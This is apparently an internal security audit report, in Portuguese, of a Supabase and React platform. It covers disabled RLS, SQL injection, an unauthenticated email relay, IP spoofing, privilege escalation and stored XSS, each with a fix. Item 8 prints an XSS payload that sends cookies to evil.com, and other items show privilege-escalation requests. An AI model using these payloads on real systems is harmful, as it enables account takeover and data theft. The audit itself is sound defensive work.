# Auditoria de Segurança — MACOM Central

> Realizada em 2026-08-25. Escopo: backend Supabase (Edge Functions + migrations em `supabase/`) e frontend (apps React em `apps/**` e pacotes `packages/@macom/*`).

## ✅ Correções já aplicadas

### Proteção contra força bruta / múltiplas tentativas de login

Plano em 5 camadas proposto; status de cada uma:

1. **[FEITO] CAPTCHA no login (Cloudflare Turnstile)** — widget integrado em
   `packages/ui/src/turnstile-widget.jsx` e `packages/ui/src/auth-login-card.jsx` (componente
   compartilhado por todos os 7 apps: central, admin, crm, servicos, intranet, relatorios,
   comunicacao). `captchaToken` propagado até `supabase.auth.signInWithPassword` em cada app.
   Site key pública em `VITE_TURNSTILE_SITE_KEY` (`.env.local` da raiz, cobre todos os apps via
   `envDir` compartilhado). Secret key já cadastrada no Dashboard do Supabase (Auth → Attack
   Protection). Sem a env var, o CAPTCHA fica desativado automaticamente (não quebra ambientes
   sem a variável configurada). Testes do `central` (única suite existente) ajustados e passando.
   **Pendente:** adicionar `VITE_TURNSTILE_SITE_KEY` nas env vars de cada projeto **Vercel**
   (produção) — o `.env.local` só vale para dev local.
2. **[PENDENTE] Apertar rate limit nativo do Supabase Auth** — hoje `sign_in_sign_ups = 30`/hora
   por IP (`supabase/config.toml:202`, config local; confirmar/ajustar também no Dashboard de
   produção). Verificar se o IP real chega corretamente atrás de proxy/CDN antes de apertar.
3. **[PENDENTE] Lockout progressivo por conta** — Supabase Auth só limita por IP, não por e-mail;
   um ataque distribuído contorna o rate limit por IP. Requer lógica própria (contar falhas por
   e-mail, reaproveitando `gestao_plataforma.logs_acesso`) — ainda não implementado.
4. **[PENDENTE] Aumentar `minimum_password_length`** — hoje `6` (`supabase/config.toml:177`),
   recomendado subir para 8-10 e considerar `password_requirements`.
5. **[PENDENTE] Alertar sobre picos de tentativas falhas** — não há dashboard/alerta hoje sobre
   picos de falha de login por IP/conta em `logs_acesso`.

---

## 🔴 CRÍTICO

### 1. RLS desabilitada em `acessos_usuario_sistema` e `sistemas` — auto-escalada de privilégio total
**Arquivo:** `supabase/migrations/20260512143000_grant_sistemas_access_to_authenticated.sql:1-4`

```sql
grant select, insert, update, delete on table public.acessos_usuario_sistema to authenticated;
alter table public.sistemas disable row level security;
alter table public.acessos_usuario_sistema disable row level security;
```

Essas migrations desabilitam RLS e concedem CRUD completo à role `authenticated` na tabela que **todas** as Edge Functions usam para decidir permissão (admin/gestor por sistema: `crm_has_access()`, `pagamentos_is_financeiro()`, `intranet_is_admin()`, `isGlobalAdmin`, etc.). Como o Supabase permite acesso direto via `supabase-js` com a `anon key`, qualquer usuário autenticado pode rodar:

```js
supabase.from('acessos_usuario_sistema').insert({ colaborador_id: meuId, sistema_id: alvo, nivel_acesso: 'admin', ativo: true })
```

e virar admin de qualquer app (CRM, Financeiro, Intranet, Relatórios, Central) sem passar por nenhuma Edge Function.

**Correção:** reabilitar RLS em `sistemas` e `acessos_usuario_sistema`; restringir `insert/update/delete` a `service_role` (as Edge Functions já usam service role e fazem a checagem de admin — a tabela nunca deveria ser gravável pelo cliente).

### 2. SQL Injection via `orderBy` em `intranet-api`
**Arquivo:** `supabase/functions/intranet-api/index.ts`, `convertOrder()` (~932-939), usado em `listBaseEntity`/`filterBaseEntity`/`listAnnouncements`/`listDocuments` (~2255, 2269, 2284, 2486)

```js
const column = config.orderMap[key as keyof typeof config.orderMap] || key; // fallback: texto cru do cliente
...
`select * from ${config.schema}.${config.table} order by "${column}" ${ascending ? 'asc' : 'desc'} ${limitSql};`
```

`orderBy` vem do body sem whitelist estrita, e o fallback não escapa aspas duplas internas (diferente do `quoteIdentifier` usado em `crm-api`, que faz `.replace(/"/g, '""')` corretamente). A query roda via `sql.unsafe()`.

**Exploração:** qualquer colaborador autenticado com permissão padrão `view` envia `{"action":"list","entity":"KnowledgeBase","orderBy":"titulo\" ...payload..."}`, quebrando o contexto de identificador e injetando SQL arbitrário. O erro do Postgres é devolvido cru ao cliente (`normalizeError`), facilitando extração por erro.

**Correção:** rejeitar (não fazer fallback) quando `key` não existir em `orderMap`; nunca propagar `error.message` bruto do Postgres ao cliente.

---

## 🟠 HIGH

### 3. `enviar-termo-gmail` é um relay de e-mail sem autenticação
**Arquivo:** `supabase/functions/enviar-termo-gmail/index.ts` (todo o arquivo — `serve()` linha 157)

Não há checagem de JWT, secret compartilhado ou origem antes de enviar e-mail. A function lê `to`, `subject`, `body_text`, `body_html`, `filename`, `pdf_base64` diretamente do body e envia via Gmail API usando credenciais OAuth da empresa.

**Exploração:** qualquer pessoa que descubra a URL pública da function (padrão previsível `https://<project-ref>.supabase.co/functions/v1/enviar-termo-gmail`) pode fazer POST direto (CORS não bloqueia `curl`/scripts) e enviar e-mails arbitrários — inclusive phishing/spam — a partir do domínio/remetente oficial da empresa.

**Correção:** exigir JWT válido (`auth.getUser()`) e checar permissão de envio, ou no mínimo validar um secret compartilhado.

### 4. Bypass de autenticação via spoofing de IP em `intranet-api`
**Arquivo:** `supabase/functions/intranet-api/index.ts`, `getClientIp`/`getTrustedIpContext` (~675-696, 1230-1284), fallback no handler principal (~4581-4591)

```js
function getClientIp(request) {
  return normalizeForwardedIp(request.headers.get('cf-connecting-ip')) ||
    normalizeForwardedIp(request.headers.get('x-real-ip')) ||
    normalizeForwardedIp(request.headers.get('x-forwarded-for')) || ...
}
```

Quando não há JWT válido, a function tenta autenticar por IP confiável (`gestao_intranet.acessos_ip_confiavel`) lendo cabeçalhos que o próprio cliente controla, sem validar que vêm de um proxy confiável.

**Exploração:** se existir qualquer faixa de IP liberada (ex.: rede do escritório), um atacante remoto sem nenhuma credencial pode forjar `cf-connecting-ip`/`x-forwarded-for` com um IP dentro da faixa liberada e obter contexto de usuário válido, acessando avisos, dados de colaboradores (PII), feedback, documentos e calendário.

**Correção:** não usar cabeçalhos client-controlados como prova de rede confiável fora de uma borda que garanta a origem do header.

### 5. `plataforma-api` — gestor pode redefinir senha de outro gestor (account takeover)
**Arquivo:** `supabase/functions/plataforma-api/index.ts`, `updateCollaboratorPassword` (~linha 452)

A checagem só bloqueia alvo `funcao === 'admin'`, não `'gestor'` (inconsistente com `updateCollaboratorEmail`, que bloqueia ambos). Um `gestor` não-admin pode chamar `update_password` sobre outro gestor (de qualquer unidade) e assumir a conta via `adminClient.auth.admin.updateUserById`.

**Correção:** replicar em `updateCollaboratorPassword` a mesma regra de `updateCollaboratorEmail` (bloquear `admin` OU `gestor` quando ator não é global admin).

### 6. `plataforma-api` — gestor pode reescrever a matriz de permissões do Console
**Arquivo:** `supabase/functions/plataforma-api/index.ts`, `saveCentralPermission`/`saveCentralPermissionNivel`/`saveReportsFunctionPermission` (~651-711), gate em `action==='save'` (~931-941)

Nenhuma dessas rotas exige `isGlobalAdmin`; apenas `canAccessPlataforma` (admin OU gestor). Um gestor pode reescrever `permissoes_central_nivel`/`permissoes_funcoes` para elevar as próprias capacidades no Central/Relatórios.

**Correção:** exigir `isGlobalAdmin(centralAccessTier)` nessas três rotas.

### 7. `central-api` — escalada entre sistemas via `update` de `acessos_usuario_sistema`
**Arquivo:** `central-api/index.ts:2169-2213` (bloco só alcançável quando `!isCentralContext && !isGlobalAdmin && isReportsAdmin`)

```js
if (!accessRow) return json({ error: 'Registro nao encontrado.' }, 404);
if (accessRow.sistema_id !== reportsSystemId) {
  return json({ error: 'Acesso restrito ao sistema de relatorios.' }, 403);
}
...
const sanitized = sanitizePayload(entity, payload);
if (!isGlobalAdmin && sanitized.nivel_acesso === 'admin') {
  return json({ error: 'Apenas administradores podem liberar acesso admin aos sistemas.' }, 403);
}
const query = buildUpdateQuery('public', 'acessos_usuario_sistema', id, sanitized);
```

O guard valida apenas o `sistema_id` do registro **existente** (antes do update). `sanitized` pode conter `sistema_id` (campo permitido em `ENTITY_CONFIG.acessos_usuario_sistema.allowedFields`). Nada revalida que o `sistema_id` enviado no payload continua sendo o de relatórios — só `nivel_acesso === 'admin'` é bloqueado. O handler `save` valida corretamente o **novo** valor antes do insert; o `update` não replica essa checagem.

**Exploração:** um colaborador com acesso `admin` apenas ao sistema "relatorios" chama:
```
POST /central-api
{ "action": "update", "entity": "acessos_usuario_sistema",
  "id": "<id de uma linha de acesso existente com sistema_id = relatorios>",
  "payload": { "sistema_id": "<uuid do sistema CRM/servicos/central>", "nivel_acesso": "gestor" } }
```
Concedendo a si mesmo acesso fora do escopo de relatórios.

**Correção:** validar `sanitized.sistema_id` (se presente) contra `reportsSystemId` da mesma forma que o `save`, ou remover `sistema_id` do payload antes do `buildUpdateQuery` nesse bloco restrito.

### 8. XSS armazenado via `embed_code` em Relatórios
**Arquivo:** `apps/relatorios/src/pages/ReportViewer.jsx:310`

```jsx
) : report.embed_code ? (
  <div ... dangerouslySetInnerHTML={{ __html: report.embed_code }} />
```

`embed_code` é texto livre digitado num `<Textarea>` em `apps/relatorios/src/components/admin/ReportForm.jsx:227` (sem sanitização/allowlist de tags). O valor é persistido no banco e, ao abrir o relatório, `ReportViewer.jsx:155-159` tenta extrair um `src=` de `<iframe>` para renderizar de forma segura — mas quando o texto não casa com esse regex, cai no `dangerouslySetInnerHTML` bruto, sem sanitização (nenhum DOMPurify no projeto).

**Exploração:** qualquer conta com permissão de gerenciar relatórios cola um `embed_code` como `<img src=x onerror=fetch('https://evil.com/?c='+document.cookie)>`. O payload roda no navegador de todo usuário que abrir aquele relatório, permitindo roubo da sessão Supabase (JWT em `localStorage`), exfiltração de dados, ou pivô para outras rotas autenticadas do app `relatorios`.

**Correção:** sanitizar `embed_code` com DOMPurify (allowlist de `<iframe>` com domínios de BI conhecidos) antes de renderizar, ou abandonar o `dangerouslySetInnerHTML` e montar o `<iframe>` programaticamente extraindo/validando estritamente `src`/`width`/`height`.

---

## 🟡 MEDIUM

- **`plataforma-api` `deleteSystemAccess`** (~635-649): diferente de `saveSystemAccess`, o delete não valida `nivel_acesso` do registro-alvo — um gestor pode remover acesso `admin` de outro colaborador a qualquer sistema.

- **`central-api` — `delete` de `colaboradores` sem proteção anti-rebaixamento** (~2616-2688 vs. proteção equivalente em ~2513-2529 no `update`): um gestor não-global com permissão `gerenciar` em `colaboradores` pode excluir (hard delete) diretamente um colaborador `admin`/`gestor`, ação mais destrutiva que a inativação já bloqueada no `update`. Se houver `ON DELETE CASCADE`, também remove seus acessos.
  **Correção:** replicar em `action === 'delete'` a checagem `!isGlobalAdmin && ['admin','gestor'].includes(beforeRow?.funcao)`.

- **`catalog-api` — `create` de `colaboradores` aceita `id` do payload** (`allowedFields` inclui `'id'`; `delete sanitized.id` só existe no `update`, não no `create`). Como colaboradores são casados por `id = auth.users.id`, um usuário com permissão `gerenciar` em `colaboradores` pode criar registro com `id` = UUID de um usuário Auth alvo conhecido, pré-atribuindo cargo/departamento/status antes do vínculo legítimo.
  **Correção:** remover `'id'` de `allowedFields` de `colaboradores` (deixar o banco gerar o UUID).

- **`catalog-api` — módulo `acessos_usuario_sistema` herda permissão total sobre `sistemas`**: qualquer usuário com `gerenciar` em `acessos_usuario_sistema` pode `create/update/delete` na tabela `public.sistemas` (catálogo global de apps), podendo desativar/renomear o `slug` de outro app e derrubar acesso de todos os usuários a ele.
  **Correção:** restringir `create/update/delete` de `sistemas` a `isGlobalAdmin`.

- **`catalog-api` — `logs_auditoria` mutável via fallback genérico**: diferente de `acessos_usuario_sistema` (bloqueado explicitamente no fallback), `logs_auditoria` não tem proteção — um usuário com `gerenciar` nesse módulo pode alterar/apagar registros de auditoria, apagando evidências de ações administrativas.
  **Correção:** tratar `logs_auditoria`/`logs_auditoria_relatorios` como somente-leitura no fallback genérico.

- **`crm-api`** — `historico_atendimentos` criado só com `cliente_id` (sem `lead_id`) escapa da checagem de escopo `ensureLeadAccessLight` (~1247-1264), permitindo inserir histórico em clientes fora do escopo do usuário.

- **`servicos-api`** — `criar_fornecedor` acessível a qualquer papel do módulo (nível mínimo `usuario`, ~825-857), diferente de `atualizar_fornecedor`/`deletar_fornecedor` que exigem `isFinanceiro`. Permite cadastrar fornecedor com dados bancários/PIX próprios antes de solicitar pagamento a ele.

- **`servicos-api`** — `limpar_dados_teste_financeiro` (~1166-1193) apaga **toda** a tabela de pagamentos e anexos associados, sem filtrar por nenhum indicador de "teste" — mesmo restrito a admin, o `DELETE` não é seletivo.

- **`intranet-api`** — `listFeedback()` (~2411-2415) não filtra por `criado_por`; qualquer colaborador com permissão padrão `view` lista o feedback identificado (não-anônimo) de toda a empresa.

- **`public.empresas` e `public.cargos` sem RLS** (`supabase/migrations/20260709110000_create_empresas.sql:34`, `20260624150000_create_cargos.sql:54`): ambas concedem CRUD total a `authenticated` sem RLS habilitada. `empresas` é usada para escopo por empresa (`colaboradores.empresa_id`, documentos da intranet) — qualquer usuário autenticado pode corromper esse escopo.

---

## 🟢 LOW

- **`processa-fila-email` e `servicos-lembrete-aprovacoes`** sem secret de invocação dedicado — aceitam apenas o gateway JWT padrão do Supabase (`anon key` pública), permitindo disparo fora de hora por qualquer parte que conheça a chave pública do projeto.

- **`intranet-api`** — IDOR ao remover reação de aviso de outro usuário (`AnnouncementReaction`, ~4499-4532): checa apenas `avisos:view`, não `criado_por`.

- **`apps/crm/src/components/ui/chart.jsx:61`** — `dangerouslySetInnerHTML` usado para injetar CSS custom properties a partir de `ChartConfig` estático definido no código (não input de usuário/API). Risco baixo; reclassificar só se `config` passar a vir de dados de API sem validação.

---

## ✅ Verificado e considerado OK

- JWT validado (`auth.getUser()`) no topo de todo handler, em todas as Edge Functions revisadas (`admin-create-user`, `central-api`, `catalog-api`, `crm-api`, `plataforma-api`, `comunicacao-api`, `servicos-api`, `relatorios-api`, `intranet-api`) — nenhuma rota confia em `user_id`/`role`/`empresa_id` do body sem revalidar contra o colaborador resolvido pelo JWT.
- SQL dinâmico nas demais functions usa identificadores fixos (config server-side) ou `quoteIdentifier`/parametrização `$n` corretamente — não reproduz o bug do item 2 fora de `intranet-api`.
- Tabelas financeiras (`solicitacoes_pagamento`, `parcelas_pagamento`, `anexos_solicitacao`, `historico_solicitacao`, `fornecedores`, `categorias`) e logs de auditoria/acesso (`gestao_*.logs_auditoria`, `gestao_plataforma.logs_acesso`) têm RLS habilitada com policies coerentes.
- CORS: allowlist fechada de origins em `_shared/cors.ts`, sem wildcard.
- Bucket de storage `documentos` da intranet é privado (`public=false`), sem policy de leitura direta — acesso mediado por signed URL após checagem de visibilidade.
- Webhook do WhatsApp valida assinatura HMAC (`x-hub-signature-256`) antes de processar.
- Nenhum segredo hardcoded no frontend — todos os clients usam apenas `import.meta.env.VITE_SUPABASE_URL`/`VITE_SUPABASE_ANON_KEY` (chave pública); `service_role` nunca aparece fora de `supabase/functions/**`.
- Armazenamento de sessão delegado ao `supabase-js` padrão em `packages/auth/src/AuthContext.jsx` — sem log do token completo, sem envio a terceiros.
- Upload de anexos financeiros (`apps/servicos/src/lib/anexoUpload.js`) valida tipo/tamanho no client, reforçado no bucket via `allowed_mime_types`/`file_size_limit`.
- Nenhum uso de `eval`/`new Function` no frontend; nenhum open redirect de alta confiança encontrado.

---

## Prioridade recomendada

1. **Item 1** (RLS desabilitada) e **item 2** (SQL injection) — corrigir primeiro: ambos permitem comprometimento total do sistema sem depender de nenhuma Edge Function.
2. Itens HIGH (3-8) — cada um permite escalada de privilégio, account takeover ou XSS explorável por qualquer usuário autenticado (ou, no caso do item 3, por qualquer pessoa na internet).
3. Itens MEDIUM — corrigir na sequência; a maioria requer que o atacante já tenha alguma permissão elevada (gestor/módulo específico), mas ainda representa escalada horizontal/vertical real.
4. Itens LOW — reforço de defesa em profundidade.

---

## Risco de quebra ao aplicar as correções

Avaliação de impacto antes de corrigir, para priorizar o que é seguro aplicar direto vs. o que precisa de investigação prévia.

### Baixo risco — seguros para corrigir logo
- **Item 2** (SQL injection `orderBy` intranet-api): só precisa rejeitar `orderBy` fora da whitelist em vez de usar fallback cru. Se o frontend já só envia valores válidos (provável), sem impacto visível.
- **Item 7** (central-api `sistema_id` no update): replicar checagem que já existe no `save`. Não muda comportamento legítimo.
- **Item 3** (enviar-termo-gmail sem auth), **item 5** e **item 6** (plataforma-api senha/permissões de gestor): fecham gaps que nenhum fluxo legítimo do frontend deveria estar explorando.
- **Item 12** (`empresas`/`cargos` sem RLS): habilitar RLS com policy de leitura ampla e escrita restrita — sem uso legítimo dependente do CRUD aberto.
- Itens MEDIUM de permissão (`deleteSystemAccess`, delete de `colaboradores`, `criar_fornecedor`, `logs_auditoria` mutável, `id` em create de `colaboradores`, `sistemas` via módulo `acessos_usuario_sistema`, `historico_atendimentos` por `cliente_id`, feedback visível a todos): adicionar checagens de role. Só "quebra" fluxo de quem hoje depende (indevidamente) desse acesso mais aberto.

### Risco médio — testar com atenção antes de aplicar
- **Item 8** (XSS `embed_code` em Relatórios): trocar `dangerouslySetInnerHTML` por extração/validação de `src` do iframe. Se algum relatório já cadastrado usa `embed_code` que não é um `<iframe>` puro (script de BI mais complexo), ele para de renderizar — checar os `embed_code` já salvos no banco antes de aplicar.
- **Item 1** (reabilitar RLS em `acessos_usuario_sistema`/`sistemas`): o mais delicado. Se alguma Edge Function ou o frontend depende de leitura/escrita direta nessa tabela via `supabase-js` (client-side, `anon key`) sem passar por function com `service_role`, reabilitar RLS quebra esse fluxo até criar policies corretas (`select` amplo, `insert/update/delete` só via `service_role`). Levantar todos os usos de `.from('acessos_usuario_sistema'...)`/`.from('sistemas'...)` no frontend antes de aplicar, para não quebrar login/checagem de acesso.
- **Item 4** (IP spoofing intranet): remover esse mecanismo de auth por IP bloqueia quem hoje usa o "acesso automático por rede do escritório" de propósito — confirmar se o recurso é usado ativamente antes de desativar.
